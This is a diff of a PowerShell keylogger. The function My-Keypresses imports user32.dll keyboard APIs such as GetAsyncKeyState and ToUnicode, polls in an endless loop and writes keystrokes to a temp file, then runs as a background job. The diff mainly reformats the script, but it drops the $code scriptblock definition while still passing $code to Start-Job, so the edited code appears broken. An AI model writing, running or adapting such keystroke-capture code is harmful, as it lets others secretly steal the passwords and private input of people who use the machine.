@@ -1,7 +1,6 @@
-$code = {function My-Keypresses($Path="$env:temp\mykeypress.txt") 
- {
-   $signatures = @'
- [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+function My-Keypresses($Path = "$env:temp\mykeypress.txt") {
+    $signatures = @'
+    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
  public static extern short GetAsyncKeyState(int virtualKeyCode); 
  [DllImport("user32.dll", CharSet=CharSet.Auto)]
  public static extern int GetKeyboardState(byte[] keystate);
@@ -9,13 +8,13 @@ $code = {function My-Keypresses($Path="$env:temp\mykeypress.txt")
  public static extern int MapVirtualKey(uint uCode, int uMapType);
  [DllImport("user32.dll", CharSet=CharSet.Auto)]
  public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
- '@
- 
-   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+    '@
+
+    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
      
-   $null = New-Item -Path $Path -ItemType File -Force
- 
-   try
+    $null = New-Item -Path $Path -ItemType File -Force
+
+    try
    {
  
      while ($true) {
@@ -47,8 +46,6 @@ $code = {function My-Keypresses($Path="$env:temp\mykeypress.txt")
    finally
    {
    }
- }}; $timeoutSeconds = 10; $j = Start-Job -ScriptBlock $code; if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }; Remove-Job -force $j
+}; $timeoutSeconds = 10; $j = Start-Job -ScriptBlock $code; if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }; Remove-Job -force $j
 
-
-powershell -noprofile $code.My-Keypresses
-
+powershell -noprofile My-Keypresses
